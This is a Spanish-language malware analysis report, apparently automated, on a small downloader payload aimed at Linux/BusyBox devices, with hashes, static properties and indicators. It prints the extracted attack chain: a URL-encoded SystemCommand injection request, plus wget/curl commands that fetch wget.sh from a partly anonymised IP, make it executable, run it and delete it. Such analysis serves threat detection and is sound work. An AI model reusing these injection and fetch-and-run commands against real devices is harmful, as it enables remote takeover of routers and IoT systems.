# 🧬 Payload Analysis

`872d7709fab9ddfa268013afd3f9259edf21be6d580b4827f58c0b14ac4b26da`

## 📌 Resumen

Texto ASCII de 520 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `busybox wget hxxp://91.92.40.XXX/wget.sh -O .s`
2. `curl -o .s hxxp://91.92.40.XXX/wget.sh`
3. `chmod 777 .s`
4. `sh .s rep.dsyscmd`
5. `rm -f .s`
6. `wget hxxp://91.92.40.XXX/` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/872d7709fab9ddfa268013afd3f9259edf21be6d580b4827f58c0b14ac4b26da.md](../../../../../malware-like/oraculo/downloader/872d7709fab9ddfa268013afd3f9259edf21be6d580b4827f58c0b14ac4b26da.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `872d7709fab9ddfa268013afd3f9259edf21be6d580b4827f58c0b14ac4b26da`
- **SHA1:** `de98e1638542084fb083c912161047784ad4c426`
- **MD5:** `a37ed389d00f47ca61abb40b29ddb90f`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (324), with CRLF line terminators |
| Tamaño | 520 B |
| Entropía | 5.35 |
| Strings | 7 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (324), with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
ReplySuccessPage=docmd.htm&ReplyErrorPage=docmd.htm&SystemCommand=cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.dsyscmd%3Brm%20-f%20.s&ConfigSystemCommand=Save | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.169.XXX | static_analysis |
| command | ReplySuccessPage=docmd.htm&ReplyErrorPage=docmd.htm&SystemCommand=cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/ | strings |
| hash | 872d7709fab9ddfa268013afd3f9259edf21be6d580b4827f58c0b14ac4b26da | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
